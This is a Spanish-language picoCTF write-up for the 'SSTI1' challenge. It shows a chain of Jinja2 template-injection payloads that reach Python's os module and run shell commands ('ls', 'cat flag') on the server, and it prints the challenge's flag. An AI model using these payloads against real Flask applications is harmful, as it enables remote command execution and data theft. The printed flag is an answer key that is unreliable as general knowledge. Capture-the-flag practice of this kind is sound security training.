### SSTI1
### Descripcion
I made a cool website where you can announce whatever you want! Try it out!
I heard templating is a cool and modular way to build web apps! Check out my website [here](http://rescued-float.picoctf.net:49313/)!
### Solucion
- `{{4+4}}`
    - Verifica si el motor de plantillas ejecuta operaciones aritméticas básicas.
- `{{ ''.__class__ }}`
    - Accede a la clase del objeto (un string vacío) para iniciar la navegación por el árbol de objetos.
- `{{ config.__class__ }}`
    - Muestra la clase del objeto de configuración de la aplicación Flask.
- `{{ config.__class__.__init__ }}`
    - Accede al método de inicialización de la clase para llegar a sus funciones internas.
- `{{ config.__class__.__init__.__globals__ }}`
    - Mapea todas las variables y módulos globales disponibles en el contexto de esa función.
- `{{ config.__class__.__init__.__globals__['os'] }}`
    - Localiza y selecciona el módulo `os` de Python para interactuar con el sistema operativo.
- `{{ config.__class__.__init__.__globals__['os'].popen('ls').read() }}`
    - Ejecuta el comando `ls` para listar los archivos presentes en el directorio del servidor.
- `{{ config.__class__.__init__.__globals__['os'].popen('cat flag').read() }}`
	- Ejecuta `cat flag` para leer y mostrar el contenido del archivo que contiene el secreto.
picoCTF{s4rv3r_s1d3_t3mp14t3_1nj3ct10n5_4r3_c001_dcdca99a}
### Notas
### Referencias